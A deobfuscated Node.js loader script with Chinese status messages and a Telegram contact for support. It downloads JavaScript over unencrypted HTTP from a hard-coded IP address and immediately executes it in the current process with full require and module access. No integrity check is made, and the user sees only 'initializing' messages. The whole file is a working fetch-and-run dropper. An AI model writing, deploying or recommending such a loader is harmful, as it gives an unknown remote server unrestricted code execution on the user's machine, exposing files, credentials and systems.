//Sat Aug 30 2025 04:20:06 GMT+0000 (Coordinated Universal Time)
//Base:https://github.com/echo094/decode-js
//Modify:https://github.com/smallfawn/decode_action
"use strict";
const _0x7dfc94 = require("http"),
  _0x36d213 = require("vm"),
  _0x1f619f = require("module"),
  _0xb60b2b = require("path"),
  _0x2ce92d = "http://154.12.60.33:2424/release/ks/main.js";
function _0x3453e1(_0x435ff2) {
  return new Promise((_0x5e3e56, _0x1e21e0) => {
    const _0x539cb1 = new URL(_0x435ff2),
      _0x5f0abc = _0x7dfc94.request({
        "protocol": _0x539cb1.protocol,
        "hostname": _0x539cb1.hostname,
        "port": _0x539cb1.port || 80,
        "path": _0x539cb1.pathname + (_0x539cb1.search || ""),
        "method": "GET",
        "headers": {
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Node.js Runner",
          "Accept": "*/*",
          "Connection": "close"
        }
      }, _0x2324a1 => {
        if (_0x2324a1.statusCode >= 300 && _0x2324a1.statusCode < 400 && _0x2324a1.headers.location) return _0x5e3e56(_0x3453e1(_0x2324a1.headers.location));
        if (_0x2324a1.statusCode !== 200) return _0x1e21e0(new Error("HTTP " + _0x2324a1.statusCode));
        _0x2324a1.setEncoding("utf8");
        let _0x1590a4 = "";
        _0x2324a1.on("data", _0xbb8949 => _0x1590a4 += _0xbb8949);
        _0x2324a1.on("end", () => _0x5e3e56(_0x1590a4));
      });
    _0x5f0abc.setTimeout(15000, () => {
      _0x5f0abc.destroy(new Error("请求超时 请联系tg：@LeaderXiu https://t.me/LeaderXiu"));
    });
    _0x5f0abc.on("error", _0x4e3032 => _0x1e21e0(_0x4e3032));
    _0x5f0abc.end();
  });
}
(async () => {
  console.log("开始初始化，请稍等...");
  const _0x5cd05e = await _0x3453e1(_0x2ce92d);
  console.clear();
  console.log("初始化完成，开始执行...\n");
  const _0x59215e = _0xb60b2b.join(process.cwd(), "remote-pjb.js"),
    _0x27cf4b = _0x1f619f.wrap(_0x5cd05e),
    _0x589176 = new _0x36d213.Script(_0x27cf4b, {
      "filename": _0x59215e,
      "displayErrors": true
    }),
    _0x24cd03 = _0x589176.runInThisContext(),
    _0xda4fde = new _0x1f619f(_0x59215e, module);
  _0xda4fde.filename = _0x59215e;
  _0xda4fde.paths = _0x1f619f._nodeModulePaths(process.cwd());
  _0x24cd03.call(_0xda4fde.exports, _0xda4fde.exports, require, _0xda4fde, _0x59215e, _0xb60b2b.dirname(_0x59215e));
})().catch(_0x25f2d6 => {
  console.error("初始化失败，请联系tg：@LeaderXiu https://t.me/LeaderXiu 修复", _0x25f2d6 && _0x25f2d6.message ? _0x25f2d6.message : _0x25f2d6);
  process.exit(1);
});